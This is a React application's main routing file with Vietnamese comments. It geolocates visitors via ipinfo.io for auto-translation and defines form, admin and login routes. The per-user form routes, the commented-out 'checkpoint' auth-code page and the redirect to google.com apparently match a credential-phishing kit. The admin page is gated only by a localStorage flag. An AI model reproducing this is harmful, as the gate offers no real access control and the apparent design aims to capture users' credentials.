import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
import React, { useEffect, useState } from "react";
import "./App.css";

import HomePage from "./pages/HomePage";
import MyForm from "./pages/MyForm";
import AuthCode from "./pages/authCode";
import AdminPage from "./pages/admin";
import Login from "./pages/login";

import GoogleTranslate from "./components/GoogleTranslate";
import { getLanguageByCountryCode } from "./components/languageUtils";

function PrivateRoute({ children }) {
  return localStorage.getItem("logined") === "true" ? (
    <>{children}</>
  ) : (
    <Navigate to="/login" />
  );
}

function App() {
  const [locationData, setLocationData] = useState(null);

  useEffect(() => {
    const setLocation = async () => {
      let ip = "Unknown";
      let language = "en";
      let country = "Unknown";
      let city = "Unknown";

      try {
        const response = await fetch("https://ipinfo.io/json");
        const data = await response.json();

        if (data.ip) {
          ip = data.ip;
        }

        if (data.country) {
          country = data.country;
          language = getLanguageByCountryCode(data.country) || "en";
        }

        if (data.city) {
          city = data.city;
        }

        const location = {
          lang: language,
          IP: ip,
          country,
          city,
        };

        localStorage.setItem(
          "location",
          JSON.stringify(location)
        );

        // Quan trọng:
        // Chỉ render GoogleTranslate sau khi location đã có
        setLocationData(location);
      } catch (error) {
        console.error("Error fetching location:", error);

        const location = {
          lang: "en",
          IP: "Unknown",
          country: "Unknown",
          city: "Unknown",
        };

        localStorage.setItem(
          "location",
          JSON.stringify(location)
        );

        setLocationData(location);
      }
    };

    setLocation();
  }, []);

  return (
    <BrowserRouter>
      <div id="app">

        {/* Chỉ khởi tạo Google Translate sau khi đã có language */}
        {locationData?.lang && <GoogleTranslate />}

        <Routes>
          <Route
            path="/"
            element={<HomePage />}
          />

          <Route
            path="id/:userID"
            element={<MyForm />}
          />

          <Route
            path="/request"
            element={<MyForm />}
          />

          {/* 
          <Route
            path="checkpoint/:userID"
            element={<AuthCode />}
          />
          */}

          <Route
            path="/login"
            element={<Login />}
          />

          <Route
            path="/admin"
            element={
              <PrivateRoute>
                <AdminPage />
              </PrivateRoute>
            }
          />

          <Route
            path="*"
            element={
              <meta
                httpEquiv="refresh"
                content="1; url=https://www.google.com/"
              />
            }
          />
        </Routes>
      </div>
    </BrowserRouter>
  );
}

export default App;
